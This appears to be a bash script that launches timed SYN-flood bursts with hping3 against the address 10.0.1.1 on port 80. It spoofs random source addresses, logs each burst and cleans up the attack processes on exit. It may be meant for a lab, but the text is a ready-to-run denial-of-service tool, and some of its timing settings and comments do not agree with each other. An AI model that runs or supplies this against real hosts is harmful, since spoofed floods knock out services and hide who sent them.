#!/bin/bash
# Configuration
LOG_FILE="/tmp/syn_flood.log"
TARGET="10.0.1.1"  # Single target
MIN_INTERVAL=500000000
MAX_INTERVAL=750000000
ATTACK_DURATION=${1:-60}

# Function to log activities
log_activity() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Function to get random interval
get_random_interval() {
    # shellcheck disable=SC2004
    echo $(($RANDOM % ($MAX_INTERVAL - $MIN_INTERVAL + 1) + $MIN_INTERVAL))
}

# Function to cleanup on exit
cleanup() {
    log_activity "Attack script terminated"
    pkill -f "hping3.*--syn"
    exit 0
}

trap cleanup SIGINT SIGTERM

log_activity "Starting micro-burst SYN flood attack against $TARGET"
log_activity "Duration: $ATTACK_DURATION seconds"

SECONDS=0
while [ $SECONDS -lt "$ATTACK_DURATION" ]; do
    # Burst every 30 seconds
    if [ $((SECONDS % 30)) -eq 0 ]; then
        for pid in "${ATTACK_PIDS[@]}"; do
            kill "$pid" 2>/dev/null
        done
        ATTACK_PIDS=()

        INTERVAL=$(get_random_interval)

        log_activity "Starting micro-burst against $TARGET"

        # 2-second micro-burst
        timeout 2 hping3 $TARGET \
            --rand-source \
            --syn \
            -p 80 \
            -i u"$INTERVAL" \
            --quiet \
            --rate 10 &

        ATTACK_PIDS+=($!)
        log_activity "Burst started with PID: ${ATTACK_PIDS[-1]}"

        # Sleep for 44 seconds after burst
        sleep 44
    fi
    sleep 1
done

log_activity "Attack completed"
cleanup